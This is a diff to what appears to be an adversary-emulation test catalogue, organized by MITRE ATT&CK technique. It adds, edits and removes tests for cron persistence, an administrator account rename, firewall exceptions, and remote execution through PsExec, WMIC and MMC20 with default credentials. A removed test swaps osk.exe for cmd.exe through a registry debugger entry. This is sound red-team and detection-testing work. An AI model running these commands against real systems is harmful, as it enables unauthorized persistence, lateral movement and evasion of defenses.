@@ -2091,7 +2091,10 @@ privilege-escalation:
           default: "/tmp/persistevil"
       executor:
         name: bash
-        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        command: |
+          crontab -l > /tmp/notevil
+          echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        cleanup_command: 'crontab /tmp/notevil
 
 '
     - name: Cron - Add script to cron folder
@@ -2116,7 +2119,12 @@ privilege-escalation:
       executor:
         elevation_required: true
         name: bash
-        command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+        cleanup_command: 'rm /etc/cron.daily/#{cron_script_name}
+
+'
   T1574.001:
     technique:
       created: '2020-03-13T18:11:08.357Z'
@@ -6540,59 +6548,7 @@ privilege-escalation:
         techniques. "
       x_mitre_platforms:
       - Windows
-      identifier: T1574.010
-    atomic_tests:
-    - name: File System Permissions Weakness
-      auto_generated_guid: 0cb5ad48-7d61-48ac-bd4e-503d5b519dac
-      description: |
-        This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
-        powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
-        copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
-
-        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
-      supported_platforms:
-      - windows
-      input_arguments:
-        malicious_file:
-          description: File to replace weak permission file with
-          type: path
-          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
-        weak_permission_file:
-          description: check weak files permission
-          type: path
-          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
-
-'
-        prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}
-
-'
-        get_prereq_command: |
-          New-Item #{weak_permission_file} -Force | Out-Null
-          Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: 'A file to replace the original weak_permission_file. In an attack
-          this would be the malicious file gaining extra privileges
-
-'
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
-          New-Item #{malicious_file} -Force | Out-Null
-          Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
-      executor:
-        command: |
-          Get-WmiObject win32_service | select PathName
-          Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
-        cleanup_command: |
-          Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
-          Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
-        name: powershell
+    atomic_tests: []
   T1574.011:
     technique:
       external_references:
@@ -8450,18 +8406,27 @@ persistence:
           $y = Get-Random -Minimum 2 -Maximum 9999
           $z = Get-Random -Minimum 2 -Maximum 9999
           $w = Get-Random -Minimum 2 -Maximum 9999
-          Write-Host HaHaHa_$x$y$z$w
+          Write-Host HaHa_$x$y$z
 
-          $hostname = (Get-CIMInstance CIM_ComputerSystem).Name
-
-          $fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name
+          $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name
 
           foreach($member in $fmm) {
               if($member -like "*Administrator*") {
-                  Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
-                  Write-Host "Successfully Renamed Administrator Account on" $hostname
+                  $account = $member.Name -replace ".+\\\","" # strip computername\
+                  $originalDescription = (Get-LocalUser -Name $account).Description
+                  Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
+                  Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
+                  Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
                   }
               }
+        cleanup_command: |
+          $list = Get-LocalUser |?{$_.Description -like "atr:*"}
+          foreach($u in $list) {
+            $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
+            Set-LocalUser -Name $u.Name -Description $Matches.Description
+            Rename-LocalUser -Name $u.Name -NewName $Matches.Name
+            Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
+          }
         name: powershell
         elevation_required: true
     - name: Domain Account and Group Manipulate
@@ -10643,7 +10608,10 @@ persistence:
           default: "/tmp/persistevil"
       executor:
         name: bash
-        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        command: |
+          crontab -l > /tmp/notevil
+          echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        cleanup_command: 'crontab /tmp/notevil
 
 '
     - name: Cron - Add script to cron folder
@@ -10668,7 +10636,12 @@ persistence:
       executor:
         elevation_required: true
         name: bash
-        command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+        cleanup_command: 'rm /etc/cron.daily/#{cron_script_name}
+
+'
   T1574.001:
     technique:
       created: '2020-03-13T18:11:08.357Z'
@@ -15085,59 +15058,7 @@ persistence:
         techniques. "
       x_mitre_platforms:
       - Windows
-      identifier: T1574.010
-    atomic_tests:
-    - name: File System Permissions Weakness
-      auto_generated_guid: 0cb5ad48-7d61-48ac-bd4e-503d5b519dac
-      description: |
-        This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
-        powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
-        copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
-
-        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
-      supported_platforms:
-      - windows
-      input_arguments:
-        malicious_file:
-          description: File to replace weak permission file with
-          type: path
-          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
-        weak_permission_file:
-          description: check weak files permission
-          type: path
-          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
-
-'
-        prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}
-
-'
-        get_prereq_command: |
-          New-Item #{weak_permission_file} -Force | Out-Null
-          Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: 'A file to replace the original weak_permission_file. In an attack
-          this would be the malicious file gaining extra privileges
-
-'
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
-          New-Item #{malicious_file} -Force | Out-Null
-          Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
-      executor:
-        command: |
-          Get-WmiObject win32_service | select PathName
-          Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
-        cleanup_command: |
-          Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
-          Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
-        name: powershell
+    atomic_tests: []
   T1574.011:
     technique:
       external_references:
@@ -24046,6 +23967,35 @@ defense-evasion:
           Any"
         name: powershell
         elevation_required: true
+    - name: Allow Executable Through Firewall Located in Non-Standard Location
+      auto_generated_guid: 6f5822d2-d38d-4f48-9bfc-916607ff6b8c
+      description: This test will attempt to allow an executable through the system
+        firewall located in the Users directory
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_file_path:
+          description: path to exe file
+          type: path
+          default: PathToAtomicsFolder\T1562.004\bin\AtomicTest.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'exe file must exist on disk in users folder
+
+'
+        prereq_command: 'if (Get-Item "C:\Users\$env:UserName\AtomicTest.exe") {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName"
+
+'
+      executor:
+        command: netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow
+          program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
+        cleanup_command: netsh advfirewall firewall delete rule name="Atomic Test"
+        name: powershell
+        elevation_required: true
   T1562.001:
     technique:
       created: '2020-02-21T20:32:20.810Z'
@@ -32658,59 +32608,7 @@ defense-evasion:
         techniques. "
       x_mitre_platforms:
       - Windows
-      identifier: T1574.010
-    atomic_tests:
-    - name: File System Permissions Weakness
-      auto_generated_guid: 0cb5ad48-7d61-48ac-bd4e-503d5b519dac
-      description: |
-        This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
-        powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
-        copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
-
-        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
-      supported_platforms:
-      - windows
-      input_arguments:
-        malicious_file:
-          description: File to replace weak permission file with
-          type: path
-          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
-        weak_permission_file:
-          description: check weak files permission
-          type: path
-          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
-
-'
-        prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}
-
-'
-        get_prereq_command: |
-          New-Item #{weak_permission_file} -Force | Out-Null
-          Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: 'A file to replace the original weak_permission_file. In an attack
-          this would be the malicious file gaining extra privileges
-
-'
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
-          New-Item #{malicious_file} -Force | Out-Null
-          Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
-      executor:
-        command: |
-          Get-WmiObject win32_service | select PathName
-          Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
-        cleanup_command: |
-          Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
-          Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
-        name: powershell
+    atomic_tests: []
   T1574.011:
     technique:
       external_references:
@@ -37739,6 +37637,17 @@ discovery:
 
 '
         name: command_prompt
+    - name: List Internet Explorer Bookmarks using the command prompt
+      auto_generated_guid: 727dbcdb-e495-4ab1-a6c4-80c7f77aef85
+      description: This test will list the bookmarks for Internet Explorer that are
+        found in the Favorites folder
+      supported_platforms:
+      - windows
+      executor:
+        command: 'dir /s /b %USERPROFILE%\Favorites
+
+'
+        name: command_prompt
   T1087.004:
     technique:
       external_references:
@@ -41860,7 +41769,10 @@ execution:
           default: "/tmp/persistevil"
       executor:
         name: bash
-        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        command: |
+          crontab -l > /tmp/notevil
+          echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        cleanup_command: 'crontab /tmp/notevil
 
 '
     - name: Cron - Add script to cron folder
@@ -41885,7 +41797,12 @@ execution:
       executor:
         elevation_required: true
         name: bash
-        command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+        cleanup_command: 'rm /etc/cron.daily/#{cron_script_name}
+
+'
   T1559.002:
     technique:
       created: '2020-02-12T14:10:50.699Z'
@@ -42744,7 +42661,7 @@ execution:
       executor:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe #{source_file}
-          %tmp/T1106.exe
+          %tmp%/T1106.exe
         name: command_prompt
   T1059.001:
     technique:
@@ -42877,9 +42794,9 @@ execution:
           import-module #{file_path}\SharpHound.ps1
           Invoke-BloodHound -OutputDirectory $env:Temp
           Start-Sleep 5
-        cleanup_command: |
-          Remove-Item #{file_path}\SharpHound.ps1 -Force -ErrorAction Ignore
-          Remove-Item $env:Temp\*BloodHound.zip -Force
+        cleanup_command: 'Remove-Item $env:Temp\*BloodHound.zip -Force
+
+'
         name: powershell
     - name: Run Bloodhound from Memory using Download Cradle
       auto_generated_guid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
@@ -43572,9 +43489,9 @@ execution:
       auto_generated_guid: 873106b7-cfed-454b-8680-fa9f6400431c
       description: |
         Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments
-        Will run a command on a remote host.
+        Will start a process on a remote host.
 
-        Upon successful execution, powershell will download psexec.exe and spawn calc.exe on a remote endpoint (default:localhost).
+        Upon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).
       supported_platforms:
       - windows
       input_arguments:
@@ -43582,6 +43499,14 @@ execution:
           description: Remote hostname or IP address
           type: string
           default: localhost
+        user_name:
+          description: Username
+          type: String
+          default: DOMAIN\Administrator
+        password:
+          description: Password
+          type: String
+          default: P@ssw0rd1
         psexec_exe:
           description: Path to PsExec
           type: string
@@ -43600,10 +43525,11 @@ execution:
           New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
-        command: '#{psexec_exe} \\#{remote_host} -accepteula "C:\Windows\System32\calc.exe"
+        command: '#{psexec_exe} \\#{remote_host} -u #{user_name} -p #{password} -accepteula
+          "C:\Windows\System32\calc.exe"
 
 '
-        name: powershell
+        name: command_prompt
   T1129:
     technique:
       id: attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65
@@ -44287,16 +44213,25 @@ execution:
           description: Ip Address
           type: String
           default: 127.0.0.1
+        user_name:
+          description: Username
+          type: String
+          default: DOMAIN\Administrator
+        password:
+          description: Password
+          type: String
+          default: P@ssw0rd1
         process_to_execute:
           description: Name or path of process to execute.
           type: String
           default: notepad.exe
       executor:
-        command: 'wmic /node:"#{node}" process call create #{process_to_execute}
+        command: 'wmic /user:#{user_name} /password:#{password} /node:"#{node}" process
+          call create #{process_to_execute}
 
 '
-        cleanup_command: 'wmic /node:"#{node}" process where name=''#{process_to_execute}''
-          delete >nul 2>&1
+        cleanup_command: 'wmic /user:#{user_name} /password:#{password} /node:"#{node}"
+          process where name=''#{process_to_execute}'' delete >nul 2>&1
 
 '
         name: command_prompt
@@ -44571,7 +44506,31 @@ lateral-movement:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1021.003
+    atomic_tests:
+    - name: PowerShell Lateral Movement using MMC20
+      auto_generated_guid: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
+      description: |
+        Powershell lateral movement using the mmc20 application com object.
+
+        Reference:
+
+        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
+
+        Upon successful execution, cmd will spawn calc.exe on a remote computer.
+      supported_platforms:
+      - windows
+      input_arguments:
+        computer_name:
+          description: Name of Computer
+          type: string
+          default: localhost
+      executor:
+        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
+          $null, $null, "7")
+
+'
+        name: powershell
   T1210:
     technique:
       created: '2018-04-18T17:59:24.739Z'
@@ -46016,100 +45975,6 @@ lateral-movement:
 '
         name: powershell
         elevation_required: true
-    - name: PowerShell Lateral Movement
-      auto_generated_guid: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
-      description: |
-        Powershell lateral movement using the mmc20 application com object.
-
-        Reference:
-
-        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
-
-        Upon successful execution, cmd will spawn calc.exe on a remote computer.
-      supported_platforms:
-      - windows
-      input_arguments:
-        computer_name:
-          description: Name of Computer
-          type: string
-          default: computer1
-      executor:
-        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
-          $null, $null, "7")
-
-'
-        name: powershell
-    - name: WMIC Process Call Create
-      auto_generated_guid: 5cd59c3b-1375-4edf-9bac-5851c9915fca
-      description: |
-        Utilize WMIC to start remote process.
-
-        Upon successful execution, cmd will utilize wmic.exe to modify the registry on a remote endpoint to swap osk.exe with cmd.exe.
-      supported_platforms:
-      - windows
-      input_arguments:
-        user_name:
-          description: Username
-          type: String
-          default: DOMAIN\Administrator
-        password:
-          description: Password
-          type: String
-          default: P@ssw0rd1
-        computer_name:
-          description: Target Computer Name
-          type: String
-          default: Target
-      executor:
-        command: 'wmic /user:#{user_name} /password:#{password} /node:#{computer_name}
-          process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\"
-          /t REG_SZ /d \"cmd.exe\" /f"
-
-'
-        name: command_prompt
-    - name: Psexec
-      auto_generated_guid: 9bab84a1-08fd-4245-b681-e62c78283002
-      description: |
-        Utilize psexec to start remote process.
-
-        Upon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.
-      supported_platforms:
-      - windows
-      input_arguments:
-        user_name:
-          description: Username
-          type: String
-          default: DOMAIN\Administrator
-        psexec_exe:
-          description: Path to PsExec
-          type: string
-          default: C:\PSTools\PsExec.exe
-        password:
-          description: Password
-          type: String
-          default: P@ssw0rd1
-        computer_name:
-          description: Target Computer Name
-          type: String
-          default: localhost
-      dependencies:
-      - description: 'PsExec tool from Sysinternals must exist on disk at specified
-          location (#{psexec_exe})
-
-'
-        prereq_command: 'if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
-
-'
-        get_prereq_command: |
-          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
-          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
-          New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
-          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
-      executor:
-        command: "#{psexec_exe} \\\\#{computer_name} -accepteula -u #{user_name} -p
-          #{password} -s cmd.exe\n"
-        name: command_prompt
     - name: Invoke-Command
       auto_generated_guid: 5295bd61-bd7e-4744-9d52-85962a4cf2d6
       description: |
